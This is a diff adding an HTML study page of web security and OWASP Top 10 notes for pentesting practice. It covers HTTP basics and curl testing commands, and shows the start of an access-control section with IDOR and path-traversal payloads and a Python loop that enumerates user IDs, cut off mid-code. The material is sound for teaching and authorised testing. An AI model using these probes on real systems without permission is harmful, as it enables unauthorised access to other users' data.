@@ -1,14 +1,1535 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Web Security OWASP Notes</title>
-    <meta http-equiv="refresh" content="0; url=../web_security_owasp_notes.html" />
-  </head>
-  <body>
-    <p>
-      Redirecting to <a href="../web_security_owasp_notes.html">web security OWASP notes</a>...
-    </p>
-  </body>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Security & OWASP — Deep Dive Notes</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;0,900;1,400;1,700&family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&family=JetBrains+Mono:wght@300;400;500;600&family=Barlow+Condensed:wght@400;600;700;900&display=swap" rel="stylesheet">
+<style>
+/* ═══════════════════════════════════════
+   DESIGN SYSTEM — Editorial Magazine
+   ═══════════════════════════════════════ */
+:root {
+  --cream:    #f5f0e8;
+  --paper:    #ede8df;
+  --paper2:   #e4ddd2;
+  --paper3:   #d8d0c4;
+  --ink:      #1a1410;
+  --ink2:     #2e2820;
+  --ink3:     #3d3630;
+  --muted:    #7a7060;
+  --faint:    #a89e90;
+  --crimson:  #b8212a;
+  --crimson2: #d4303a;
+  --crimson3: rgba(184,33,42,0.08);
+  --orange:   #c85a1a;
+  --green:    #2d6a2d;
+  --green2:   #3d8a3d;
+  --blue:     #1a4a7a;
+  --blue2:    #1e5a9a;
+  --gold:     #8a6a1a;
+  --gold2:    #b8900a;
+  --border:   rgba(26,20,16,0.12);
+  --border2:  rgba(26,20,16,0.22);
+  --display:  'Barlow Condensed', sans-serif;
+  --serif:    'Playfair Display', Georgia, serif;
+  --body:     'Libre Baskerville', Georgia, serif;
+  --mono:     'JetBrains Mono', monospace;
+  --sw:       265px;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--cream);
+  color: var(--ink);
+  font-family: var(--body);
+  font-size: 14px;
+  line-height: 1.8;
+}
+
+/* Subtle paper grain */
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='200' height='200' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
+  pointer-events: none; z-index: 0;
+}
+
+/* ═══ SIDEBAR ═══════════════════════════ */
+.sidebar {
+  position: fixed; left: 0; top: 0; bottom: 0;
+  width: var(--sw);
+  background: var(--ink);
+  overflow-y: auto; z-index: 200;
+  display: flex; flex-direction: column;
+}
+.sidebar::-webkit-scrollbar { width: 3px; }
+.sidebar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); }
+
+.sb-top {
+  padding: 30px 22px 24px;
+  border-bottom: 1px solid rgba(255,255,255,0.08);
+  position: relative;
+}
+.sb-top::after {
+  content: ''; position: absolute; bottom: -1px; left: 0; right: 0; height: 1px;
+  background: linear-gradient(90deg, var(--crimson), transparent);
+}
+.sb-flag {
+  font-family: var(--display); font-size: 9px;
+  letter-spacing: .28em; text-transform: uppercase;
+  color: var(--crimson2); margin-bottom: 12px;
+}
+.sb-title {
+  font-family: var(--serif); font-size: 20px; font-weight: 900;
+  color: #fff; line-height: 1.15; letter-spacing: .01em;
+}
+.sb-title em { color: var(--crimson2); font-style: italic; }
+.sb-issue {
+  margin-top: 10px;
+  font-family: var(--mono); font-size: 9px;
+  color: rgba(255,255,255,0.3); letter-spacing: .08em;
+}
+
+.sb-sec {
+  padding: 14px 22px 4px;
+  font-family: var(--display); font-size: 9px;
+  letter-spacing: .22em; text-transform: uppercase;
+  color: rgba(255,255,255,0.25); border-top: 1px solid rgba(255,255,255,0.05);
+  margin-top: 8px;
+}
+.sb-link {
+  display: flex; align-items: center; gap: 10px;
+  padding: 7px 22px; cursor: pointer; transition: all .15s;
+  border-left: 2px solid transparent;
+}
+.sb-link:hover { background: rgba(255,255,255,0.04); }
+.sb-link.active { border-left-color: var(--crimson); background: rgba(184,33,42,0.1); }
+.sb-link-n { font-family: var(--mono); font-size: 10px; color: rgba(255,255,255,0.2); min-width: 20px; }
+.sb-link-t { font-family: var(--body); font-size: 12px; color: rgba(255,255,255,0.55); }
+.sb-link.active .sb-link-t { color: rgba(255,255,255,0.9); }
+
+.sb-owasp {
+  margin: 12px 14px;
+  background: rgba(184,33,42,0.12);
+  border: 1px solid rgba(184,33,42,0.3);
+  padding: 10px 14px;
+}
+.sb-owasp-title { font-family: var(--display); font-size: 9px; letter-spacing: .2em; color: var(--crimson2); text-transform: uppercase; margin-bottom: 8px; }
+.sb-owasp-item { display: flex; gap: 6px; font-family: var(--mono); font-size: 10px; color: rgba(255,255,255,0.45); padding: 2px 0; cursor: pointer; transition: color .15s; }
+.sb-owasp-item:hover { color: var(--crimson2); }
+.sb-owasp-item .oi-n { color: var(--crimson2); min-width: 28px; }
+
+.sb-foot {
+  margin-top: auto; padding: 14px 22px;
+  border-top: 1px solid rgba(255,255,255,0.06);
+  font-family: var(--mono); font-size: 10px; color: rgba(255,255,255,0.25); line-height: 1.9;
+}
+
+/* ═══ MAIN ═══════════════════════════════ */
+.main { margin-left: var(--sw); position: relative; z-index: 1; }
+
+/* ═══ HERO ════════════════════════════════ */
+.hero {
+  background: var(--ink);
+  padding: 64px 72px 56px;
+  position: relative; overflow: hidden;
+  border-bottom: 4px solid var(--crimson);
+}
+.hero::before {
+  content: 'OWASP';
+  position: absolute; right: -20px; bottom: -20px;
+  font-family: var(--display); font-size: 220px; font-weight: 900;
+  color: rgba(255,255,255,0.02); line-height: 1; letter-spacing: -.02em;
+  pointer-events: none;
+}
+.hero-rule {
+  display: flex; align-items: center; gap: 16px;
+  margin-bottom: 24px;
+}
+.hero-rule .r-line { height: 1px; flex: 1; background: rgba(255,255,255,0.1); }
+.hero-rule .r-tag {
+  font-family: var(--display); font-size: 9px; letter-spacing: .28em;
+  text-transform: uppercase; color: var(--crimson2);
+  border: 1px solid rgba(184,33,42,0.4); padding: 4px 12px;
+}
+.hero h1 {
+  font-family: var(--serif); font-size: clamp(40px, 6vw, 72px);
+  font-weight: 900; color: #fff; line-height: 1.0;
+  letter-spacing: -.01em; margin-bottom: 8px;
+}
+.hero h1 em { color: var(--crimson2); font-style: italic; }
+.hero-sub {
+  font-family: var(--body); font-size: 14px;
+  color: rgba(255,255,255,0.45); max-width: 600px;
+  line-height: 1.8; font-weight: 400; margin-top: 16px;
+  font-style: italic;
+}
+.hero-meta {
+  display: grid; grid-template-columns: repeat(4, auto);
+  gap: 0; margin-top: 40px; width: fit-content;
+}
+.hm-stat {
+  padding: 16px 28px; border: 1px solid rgba(255,255,255,0.08);
+  text-align: center;
+}
+.hm-stat:first-child { border-left: 2px solid var(--crimson); }
+.hm-val { font-family: var(--display); font-size: 32px; font-weight: 900; color: var(--crimson2); letter-spacing: .02em; }
+.hm-lbl { font-family: var(--mono); font-size: 9px; color: rgba(255,255,255,0.3); letter-spacing: .15em; text-transform: uppercase; margin-top: 2px; }
+
+/* ═══ SECTION ════════════════════════════ */
+.section {
+  padding: 56px 72px;
+  border-bottom: 1px solid var(--border);
+  position: relative;
+}
+.section:nth-child(even) { background: var(--paper); }
+
+.sec-kicker {
+  display: flex; align-items: center; gap: 12px; margin-bottom: 8px;
+}
+.sec-num {
+  font-family: var(--display); font-size: 52px; font-weight: 900;
+  color: rgba(26,20,16,0.07); line-height: 1; letter-spacing: .02em;
+  margin-top: -6px; flex-shrink: 0;
+}
+.sec-tag {
+  font-family: var(--display); font-size: 9px; letter-spacing: .24em;
+  text-transform: uppercase; color: var(--crimson);
+  border-bottom: 2px solid var(--crimson); padding-bottom: 2px;
+}
+.sec-title {
+  font-family: var(--serif); font-size: 28px; font-weight: 700;
+  color: var(--ink); line-height: 1.2; margin-bottom: 6px;
+}
+.sec-deck {
+  font-family: var(--body); font-size: 13px; color: var(--muted);
+  font-style: italic; max-width: 680px; line-height: 1.75; margin-bottom: 32px;
+}
+
+/* ═══ OWASP CARDS ════════════════════════ */
+.owasp-grid { display: flex; flex-direction: column; gap: 0; }
+.owasp-card {
+  border: 1px solid var(--border);
+  border-left: 4px solid;
+  margin-bottom: 22px;
+  background: #fff;
+  overflow: hidden;
+}
+.owasp-card.risk-critical { border-left-color: var(--crimson); }
+.owasp-card.risk-high { border-left-color: var(--orange); }
+.owasp-card.risk-medium { border-left-color: var(--gold2); }
+.owasp-card.risk-low { border-left-color: var(--green); }
+
+.oc-header {
+  display: flex; align-items: center; gap: 0;
+  cursor: pointer; user-select: none;
+  border-bottom: 1px solid var(--border);
+}
+.oc-num {
+  font-family: var(--display); font-size: 11px; font-weight: 900;
+  letter-spacing: .1em; padding: 14px 16px;
+  background: var(--ink); color: #fff; min-width: 56px; text-align: center;
+  flex-shrink: 0;
+}
+.oc-name-wrap { flex: 1; padding: 12px 18px; }
+.oc-name { font-family: var(--display); font-size: 17px; font-weight: 700; color: var(--ink); letter-spacing: .04em; }
+.oc-tagline { font-family: var(--body); font-size: 11px; color: var(--muted); font-style: italic; margin-top: 2px; }
+.oc-meta { display: flex; gap: 8px; padding: 12px 18px; flex-shrink: 0; align-items: center; }
+.oc-badge {
+  font-family: var(--display); font-size: 9px; letter-spacing: .12em;
+  text-transform: uppercase; padding: 3px 10px; border: 1px solid; font-weight: 700;
+}
+.badge-crit { color: var(--crimson); border-color: var(--crimson); background: var(--crimson3); }
+.badge-high { color: var(--orange); border-color: rgba(200,90,26,.3); background: rgba(200,90,26,.07); }
+.badge-med  { color: var(--gold2); border-color: rgba(184,144,10,.3); background: rgba(184,144,10,.07); }
+.badge-low  { color: var(--green); border-color: rgba(45,106,45,.3); background: rgba(45,106,45,.07); }
+.oc-chev { color: var(--faint); font-size: 12px; margin-right: 14px; transition: transform .2s; }
+.owasp-card.open .oc-chev { transform: rotate(180deg); }
+.oc-body { padding: 24px 22px; display: none; }
+.owasp-card.open .oc-body { display: block; }
+.owasp-card.always .oc-body { display: block; }
+
+/* ═══ CODE BLOCKS ════════════════════════ */
+.code {
+  background: var(--ink2);
+  border: 1px solid rgba(255,255,255,0.06);
+  margin: 14px 0; overflow: hidden;
+  border-radius: 2px;
+}
+.code-bar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 8px 16px; background: var(--ink);
+  border-bottom: 1px solid rgba(255,255,255,0.06);
+}
+.code-title { font-family: var(--mono); font-size: 10px; color: rgba(255,255,255,0.3); letter-spacing: .1em; }
+.cb-right { display: flex; align-items: center; gap: 10px; }
+.code-lang {
+  font-family: var(--display); font-size: 9px; letter-spacing: .2em;
+  text-transform: uppercase; color: var(--crimson2);
+  border: 1px solid rgba(184,33,42,0.3); padding: 1px 8px;
+}
+.copy-btn {
+  font-family: var(--mono); font-size: 10px; color: rgba(255,255,255,0.3);
+  background: none; border: 1px solid rgba(255,255,255,0.1);
+  padding: 2px 10px; cursor: pointer; transition: all .15s; letter-spacing: .05em;
+}
+.copy-btn:hover { color: #fff; border-color: rgba(255,255,255,0.3); }
+pre {
+  padding: 18px 20px; font-family: var(--mono); font-size: 12px;
+  line-height: 1.85; overflow-x: auto; color: rgba(255,255,255,0.78);
+}
+pre::-webkit-scrollbar { height: 3px; }
+pre::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); }
+.k  { color: #ff6b9d; }
+.s  { color: #98d982; }
+.c  { color: rgba(255,255,255,0.28); font-style: italic; }
+.v  { color: #ffc06a; }
+.f  { color: #82caff; }
+.n  { color: #ff9d6a; }
+.t  { color: #c9b1ff; }
+.p  { color: #ff4d6d; font-weight: 600; }
+
+/* ═══ DIAGRAMS ════════════════════════════ */
+.diagram {
+  background: var(--paper2);
+  border: 1px solid var(--border2);
+  border-left: 3px solid var(--crimson);
+  padding: 18px 22px; margin: 14px 0;
+  font-family: var(--mono); font-size: 11.5px;
+  line-height: 1.85; overflow-x: auto;
+  white-space: pre; color: var(--ink3);
+}
+.dh { color: var(--crimson); font-weight: 700; }
+.dg { color: var(--green); font-weight: 600; }
+.dr { color: var(--orange); }
+.db { color: var(--blue); }
+.dy { color: var(--gold2); }
+.dd { color: var(--faint); }
+
+/* ═══ CALLOUTS ════════════════════════════ */
+.note {
+  border-left: 3px solid; padding: 13px 18px;
+  margin: 14px 0; font-size: 13.5px; line-height: 1.7;
+}
+.note-lbl { font-family: var(--display); font-size: 9px; letter-spacing: .22em; text-transform: uppercase; font-weight: 700; margin-bottom: 5px; }
+.nt { border-color: var(--blue); background: rgba(26,74,122,.06); }
+.nt .note-lbl { color: var(--blue); }
+.nr { border-color: var(--crimson); background: var(--crimson3); }
+.nr .note-lbl { color: var(--crimson); }
+.ng { border-color: var(--green); background: rgba(45,106,45,.06); }
+.ng .note-lbl { color: var(--green); }
+.ny { border-color: var(--gold2); background: rgba(184,144,10,.07); }
+.ny .note-lbl { color: var(--gold2); }
+
+/* ═══ TABLES ══════════════════════════════ */
+.dt { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 13px; }
+.dt th {
+  background: var(--ink); color: #fff;
+  font-family: var(--display); font-weight: 700; font-size: 11px;
+  letter-spacing: .08em; padding: 10px 16px; text-align: left;
+}
+.dt td { padding: 9px 16px; border-bottom: 1px solid var(--border); color: var(--ink3); vertical-align: top; }
+.dt tr:hover td { background: var(--paper); }
+.mc { font-family: var(--mono); font-size: 11px; color: var(--blue2); }
+
+/* ═══ GRIDS ═══════════════════════════════ */
+.g2 { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; }
+.g3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 14px; }
+.g12 { display: grid; grid-template-columns: 1fr 2fr; gap: 18px; }
+@media(max-width:900px) {
+  .g2,.g3,.g12 { grid-template-columns: 1fr; }
+  .main { margin-left: 0; }
+  .sidebar { display: none; }
+  .hero,.section { padding: 36px 24px; }
+}
+
+.mini {
+  background: #fff;
+  border: 1px solid var(--border);
+  padding: 16px 18px;
+}
+.mini h4 { font-family: var(--display); font-size: 13px; font-weight: 700; color: var(--crimson); letter-spacing: .06em; text-transform: uppercase; margin-bottom: 10px; }
+.mini p, .mini li { font-family: var(--body); font-size: 13px; color: var(--ink3); line-height: 1.7; }
+.mini li { margin-bottom: 4px; }
+
+/* ═══ REQUEST/RESPONSE VISUAL ════════════ */
+.http-vis { display: grid; grid-template-columns: 1fr auto 1fr; gap: 0; margin: 18px 0; align-items: stretch; }
+.http-box { padding: 14px 16px; border: 1px solid var(--border); background: #fff; }
+.http-box .hb-title { font-family: var(--display); font-size: 10px; letter-spacing: .18em; text-transform: uppercase; color: var(--faint); margin-bottom: 10px; }
+.http-box pre { background: transparent; color: var(--ink3); font-size: 11px; line-height: 1.7; padding: 0; border: none; white-space: pre; }
+.http-arrow { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 14px; background: var(--paper2); border-top: 1px solid var(--border); border-bottom: 1px solid var(--border); }
+.http-arrow .ha-label { font-family: var(--mono); font-size: 9px; color: var(--crimson); writing-mode: vertical-lr; letter-spacing: .12em; text-transform: uppercase; }
+
+/* ═══ ATTACK FLOW ═════════════════════════ */
+.atk-flow { display: flex; align-items: center; flex-wrap: wrap; gap: 0; margin: 16px 0; }
+.af-step { background: var(--ink); color: #fff; padding: 10px 16px; font-family: var(--mono); font-size: 11px; text-align: center; line-height: 1.4; min-width: 100px; }
+.af-step.red { background: var(--crimson); }
+.af-step.orange { background: var(--orange); }
+.af-step.green { background: var(--green); }
+.af-arr { color: var(--faint); padding: 0 4px; font-size: 16px; }
+
+/* ═══ PAYLOAD BOX ═════════════════════════ */
+.payload {
+  background: var(--ink);
+  border: 1px solid rgba(184,33,42,0.3);
+  border-left: 3px solid var(--crimson);
+  padding: 14px 18px; margin: 12px 0;
+  font-family: var(--mono); font-size: 12px;
+  line-height: 1.85; overflow-x: auto;
+  white-space: pre; color: #ff9d6a;
+}
+.payload .pl-label { font-family: var(--display); font-size: 9px; letter-spacing: .2em; text-transform: uppercase; color: rgba(255,255,255,0.3); margin-bottom: 6px; display: block; }
+
+/* ═══ MISC ════════════════════════════════ */
+p { margin-bottom: 10px; font-size: 14px; color: var(--ink3); font-weight: 400; }
+p:last-child { margin-bottom: 0; }
+strong { color: var(--ink); font-weight: 700; }
+em { font-style: italic; }
+ul,ol { padding-left: 20px; margin: 8px 0; }
+li { margin-bottom: 5px; font-size: 13.5px; color: var(--ink3); line-height: 1.7; }
+.mi { font-family: var(--mono); font-size: 11px; background: var(--paper2); padding: 1px 6px; border: 1px solid var(--border2); color: var(--blue2); }
+.tag-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 16px; }
+.tpill { font-family: var(--display); font-size: 9px; letter-spacing: .14em; text-transform: uppercase; padding: 3px 10px; border: 1px solid var(--border2); color: var(--muted); }
+hr { border: none; border-top: 1px solid var(--border); margin: 22px 0; }
+.divider-rule { display: flex; align-items: center; gap: 16px; margin: 22px 0; }
+.divider-rule::before, .divider-rule::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+.divider-rule span { font-family: var(--display); font-size: 9px; letter-spacing: .2em; color: var(--faint); text-transform: uppercase; }
+
+/* Animate sections on load */
+@keyframes fadeUp { from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
+.section { animation: fadeUp .4s ease both; }
+.section:nth-child(2) { animation-delay: .05s; }
+.section:nth-child(3) { animation-delay: .1s; }
+</style>
+</head>
+<body>
+
+<!-- ═══════════════ SIDEBAR ═══════════════ -->
+<nav class="sidebar">
+  <div class="sb-top">
+    <div class="sb-flag">Cybersec Notes · Vol. III</div>
+    <div class="sb-title">Web Security<br>& <em>OWASP</em></div>
+    <div class="sb-issue">// deep dive · commands & code</div>
+  </div>
+
+  <!-- OWASP Quick Jump -->
+  <div class="sb-owasp">
+    <div class="sb-owasp-title">OWASP Top 10 — 2021</div>
+    <div class="sb-owasp-item" onclick="goS('owasp-a01')"><span class="oi-n">A01</span>Broken Access Control</div>
+    <div class="sb-owasp-item" onclick="goS('owasp-a02')"><span class="oi-n">A02</span>Cryptographic Failures</div>
+    <div class="sb-owasp-item" onclick="goS('owasp-a03')"><span class="oi-n">A03</span>Injection (SQLi, etc.)</div>
+    <div class="sb-owasp-item" onclick="goS('owasp-a04')"><span class="oi-n">A04</span>Insecure Design</div>
+    <div class="sb-owasp-item" onclick="goS('owasp-a05')"><span class="oi-n">A05</span>Security Misconfiguration</div>
+    <div class="sb-owasp-item" onclick="goS('owasp-a06')"><span class="oi-n">A06</span>Vulnerable Components</div>
+    <div class="sb-owasp-item" onclick="goS('owasp-a07')"><span class="oi-n">A07</span>Auth Failures</div>
+    <div class="sb-owasp-item" onclick="goS('owasp-a08')"><span class="oi-n">A08</span>Integrity Failures</div>
+    <div class="sb-owasp-item" onclick="goS('owasp-a09')"><span class="oi-n">A09</span>Logging Failures</div>
+    <div class="sb-owasp-item" onclick="goS('owasp-a10')"><span class="oi-n">A10</span>SSRF</div>
+  </div>
+
+  <div class="sb-sec">Core Topics</div>
+  <div class="sb-link active" onclick="goS('s1',this)"><span class="sb-link-n">01</span><span class="sb-link-t">HTTP Fundamentals</span></div>
+  <div class="sb-link" onclick="goS('s2',this)"><span class="sb-link-n">02</span><span class="sb-link-t">OWASP Top 10</span></div>
+  <div class="sb-link" onclick="goS('s3',this)"><span class="sb-link-n">03</span><span class="sb-link-t">SQL Injection</span></div>
+  <div class="sb-link" onclick="goS('s4',this)"><span class="sb-link-n">04</span><span class="sb-link-t">XSS — Cross-Site Scripting</span></div>
+  <div class="sb-link" onclick="goS('s5',this)"><span class="sb-link-n">05</span><span class="sb-link-t">CSRF & IDOR</span></div>
+  <div class="sb-link" onclick="goS('s6',this)"><span class="sb-link-n">06</span><span class="sb-link-t">Authentication Attacks</span></div>
+  <div class="sb-sec">Tools & Defense</div>
+  <div class="sb-link" onclick="goS('s7',this)"><span class="sb-link-n">07</span><span class="sb-link-t">Burp Suite Workflow</span></div>
+  <div class="sb-link" onclick="goS('s8',this)"><span class="sb-link-n">08</span><span class="sb-link-t">SSRF & XXE</span></div>
+  <div class="sb-link" onclick="goS('s9',this)"><span class="sb-link-n">09</span><span class="sb-link-t">Security Headers</span></div>
+  <div class="sb-link" onclick="goS('s10',this)"><span class="sb-link-n">10</span><span class="sb-link-t">Quick Reference</span></div>
+
+  <div class="sb-foot">
+    topics: 10 &nbsp;|&nbsp; owasp: all 10<br>
+    payloads: 50+ &nbsp;|&nbsp; tools: burp/zap<br>
+    exam: portswigger / bscp
+  </div>
+</nav>
+
+<!-- ═══════════════ MAIN ═══════════════════ -->
+<main class="main">
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-rule">
+    <div class="r-line"></div>
+    <div class="r-tag">Phase 2 · Core Security Concepts</div>
+    <div class="r-line"></div>
+  </div>
+  <h1>Web Security<br>& <em>OWASP</em></h1>
+  <p class="hero-sub">A practitioner's deep-dive covering all OWASP Top 10 vulnerabilities, attack mechanics, exploitation payloads, Burp Suite methodology, and defensive code — everything needed for PortSwigger Academy, bug bounty, and web pentesting.</p>
+  <div class="hero-meta">
+    <div class="hm-stat"><div class="hm-val">10</div><div class="hm-lbl">OWASP Top 10</div></div>
+    <div class="hm-stat"><div class="hm-val">50+</div><div class="hm-lbl">Payloads</div></div>
+    <div class="hm-stat"><div class="hm-val">30+</div><div class="hm-lbl">Code Examples</div></div>
+    <div class="hm-stat"><div class="hm-val">BSCP</div><div class="hm-lbl">Exam Level</div></div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════════════════
+     S1 · HTTP FUNDAMENTALS
+══════════════════════════════════════════════════ -->
+<section class="section" id="s1">
+  <div class="sec-kicker"><div class="sec-num">01</div><div class="sec-tag">Foundation</div></div>
+  <div class="sec-title">HTTP Fundamentals</div>
+  <p class="sec-deck">Every web attack happens over HTTP. Understanding the protocol at the raw level is non-negotiable — requests, responses, headers, cookies, sessions.</p>
+
+  <div class="http-vis">
+    <div class="http-box">
+      <div class="hb-title">HTTP Request</div>
+      <pre><span style="color:var(--crimson);font-weight:700">POST</span> /login HTTP/1.1
+<span style="color:var(--blue)">Host:</span> target.com
+<span style="color:var(--blue)">Content-Type:</span> application/x-www-form-urlencoded
+<span style="color:var(--blue)">Cookie:</span> session=abc123
+<span style="color:var(--blue)">User-Agent:</span> Mozilla/5.0
+<span style="color:var(--blue)">Content-Length:</span> 29
+
+<span style="color:var(--gold2)">username=admin&password=pass</span></pre>
+    </div>
+    <div class="http-arrow">
+      <span class="ha-label">HTTP/TCP</span>
+    </div>
+    <div class="http-box">
+      <div class="hb-title">HTTP Response</div>
+      <pre><span style="color:var(--green);font-weight:700">HTTP/1.1 200 OK</span>
+<span style="color:var(--blue)">Content-Type:</span> text/html
+<span style="color:var(--blue)">Set-Cookie:</span> session=xyz; HttpOnly; Secure
+<span style="color:var(--blue)">X-Frame-Options:</span> DENY
+<span style="color:var(--blue)">Content-Security-Policy:</span> default-src 'self'
+<span style="color:var(--blue)">Strict-Transport-Security:</span> max-age=31536000
+
+&lt;html&gt;Welcome, admin&lt;/html&gt;</pre>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="mini">
+      <h4>HTTP Methods</h4>
+      <table class="dt">
+        <tr><th>Method</th><th>Purpose</th><th>Has Body?</th></tr>
+        <tr><td class="mc">GET</td><td>Retrieve resource</td><td>No</td></tr>
+        <tr><td class="mc">POST</td><td>Submit / create</td><td>Yes</td></tr>
+        <tr><td class="mc">PUT</td><td>Replace resource</td><td>Yes</td></tr>
+        <tr><td class="mc">PATCH</td><td>Partial update</td><td>Yes</td></tr>
+        <tr><td class="mc">DELETE</td><td>Remove resource</td><td>No</td></tr>
+        <tr><td class="mc">OPTIONS</td><td>List allowed methods</td><td>No</td></tr>
+        <tr><td class="mc">HEAD</td><td>Headers only</td><td>No</td></tr>
+      </table>
+    </div>
+    <div class="mini">
+      <h4>Status Codes</h4>
+      <table class="dt">
+        <tr><th>Range</th><th>Meaning</th><th>Key codes</th></tr>
+        <tr><td class="mc" style="color:var(--green)">2xx</td><td>Success</td><td>200 OK, 201 Created</td></tr>
+        <tr><td class="mc" style="color:var(--blue)">3xx</td><td>Redirect</td><td>301 Perm, 302 Temp</td></tr>
+        <tr><td class="mc" style="color:var(--orange)">4xx</td><td>Client Error</td><td>401 Unauth, 403 Forbid, 404</td></tr>
+        <tr><td class="mc" style="color:var(--crimson)">5xx</td><td>Server Error</td><td>500 ISE → stack trace!</td></tr>
+      </table>
+      <div class="note nr" style="margin-top:10px">
+        <div class="note-lbl">Pentester Note</div>
+        500 errors can leak stack traces, tech stack, file paths. 403 ≠ not exploitable — try method tampering, path traversal, header injection.
+      </div>
+    </div>
+  </div>
+
+  <div class="code">
+    <div class="code-bar"><div class="code-title">curl — essential web testing</div><div class="cb-right"><span class="code-lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+    <pre><span class="c"># ── BASIC REQUESTS ──────────────────────────────────</span>
+<span class="f">curl</span> <span class="s">https://target.com</span>                     <span class="c"># GET request</span>
+<span class="f">curl</span> <span class="v">-I</span> <span class="s">https://target.com</span>                  <span class="c"># HEAD — headers only</span>
+<span class="f">curl</span> <span class="v">-v</span> <span class="s">https://target.com</span>                  <span class="c"># verbose — show all</span>
+<span class="f">curl</span> <span class="v">-X POST</span> <span class="s">https://target.com/login</span> \
+     <span class="v">-d</span> <span class="s">"username=admin&password=pass"</span>         <span class="c"># POST form data</span>
+<span class="f">curl</span> <span class="v">-X POST</span> <span class="s">https://target.com/api</span> \
+     <span class="v">-H</span> <span class="s">"Content-Type: application/json"</span> \
+     <span class="v">-d</span> <span class="s">'{"user":"admin","pass":"x"}'</span>          <span class="c"># JSON POST</span>
+
+<span class="c"># ── AUTHENTICATION ──────────────────────────────────</span>
+<span class="f">curl</span> <span class="v">-u admin:password</span> <span class="s">https://target.com</span>  <span class="c"># HTTP Basic Auth</span>
+<span class="f">curl</span> <span class="v">-H</span> <span class="s">"Authorization: Bearer TOKEN"</span> url  <span class="c"># JWT/Bearer token</span>
+<span class="f">curl</span> <span class="v">-b</span> <span class="s">"session=abc123"</span> <span class="s">https://target.com</span> <span class="c"># Send cookie</span>
+<span class="f">curl</span> <span class="v">-c</span> cookies.txt <span class="v">-b</span> cookies.txt <span class="s">url</span>     <span class="c"># save+send cookies</span>
+
+<span class="c"># ── TESTING ─────────────────────────────────────────</span>
+<span class="f">curl</span> <span class="v">-X OPTIONS</span> <span class="s">https://target.com</span> <span class="v">-v</span>    <span class="c"># check allowed methods</span>
+<span class="f">curl</span> <span class="v">-L</span> <span class="s">https://target.com</span>               <span class="c"># follow redirects</span>
+<span class="f">curl</span> <span class="v">-k</span> <span class="s">https://target.com</span>               <span class="c"># ignore SSL errors</span>
+<span class="f">curl</span> <span class="v">--proxy http://127.0.0.1:8080</span> url  <span class="c"># route through Burp</span></pre>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════════
+     S2 · OWASP TOP 10 OVERVIEW
+══════════════════════════════════════════════════ -->
+<section class="section" id="s2">
+  <div class="sec-kicker"><div class="sec-num">02</div><div class="sec-tag">Core Framework</div></div>
+  <div class="sec-title">OWASP Top 10 — 2021 Edition</div>
+  <p class="sec-deck">The industry's definitive web application security risk list, updated every 3–4 years. Every pentest report and secure code review references this framework.</p>
+
+  <div class="owasp-grid">
+
+    <!-- A01 -->
+    <div class="owasp-card risk-critical always" id="owasp-a01">
+      <div class="oc-header">
+        <div class="oc-num">A01</div>
+        <div class="oc-name-wrap"><div class="oc-name">BROKEN ACCESS CONTROL</div><div class="oc-tagline">Found in 94% of applications — the most common vulnerability</div></div>
+        <div class="oc-meta"><span class="oc-badge badge-crit">Critical</span></div>
+      </div>
+      <div class="oc-body">
+        <p>Access control enforces that users cannot act outside their intended permissions. Failures allow attackers to access unauthorized data, modify other users' accounts, perform privileged actions, or view all records.</p>
+        <div class="g2">
+          <div>
+            <p><strong>Common Patterns:</strong></p>
+            <ul>
+              <li><strong>IDOR</strong> — Insecure Direct Object Reference (change ID in URL)</li>
+              <li><strong>Missing function-level access</strong> — /admin accessible without auth</li>
+              <li><strong>Horizontal escalation</strong> — access other users' data</li>
+              <li><strong>Vertical escalation</strong> — user accessing admin functions</li>
+              <li><strong>Path traversal</strong> — ../../../../etc/passwd</li>
+            </ul>
+          </div>
+          <div>
+            <div class="payload"><span class="pl-label">// IDOR Examples</span>GET /api/user/<span style="color:var(--crimson2);font-weight:700">1337</span>/profile   ← change to another user's ID
+GET /api/orders/<span style="color:var(--crimson2);font-weight:700">42</span>          ← see other user's order
+GET /download?file=<span style="color:var(--crimson2);font-weight:700">../../../etc/passwd</span>
+POST /api/user/<span style="color:var(--crimson2);font-weight:700">456</span>/promote  ← promote another user</div>
+          </div>
+        </div>
+        <div class="code">
+          <div class="code-bar"><div class="code-title">access control testing</div><div class="cb-right"><span class="code-lang">python</span><button class="copy-btn" onclick="cp(this)">copy</button></div></div>
+          <pre><span class="k">import</span> requests
+
+<span class="c"># ── IDOR Test: try accessing other users' resources ──</span>
+session = requests.Session()
+session.cookies.set(<span class="s">'session'</span>, <span class="s">'YOUR_SESSION_COOKIE'</span>)
+
+<span class="c"># Your user ID is 1000 — try others</span>
+<span class="k">for</span> uid <span class="k">in</span> <span class="f">range</span>(<span class="v">999</span>, <span class="v">1010</span>):
+    r = session.get(<span class="s">f"https://target.com/api/user/{uid}/profile"</span>)
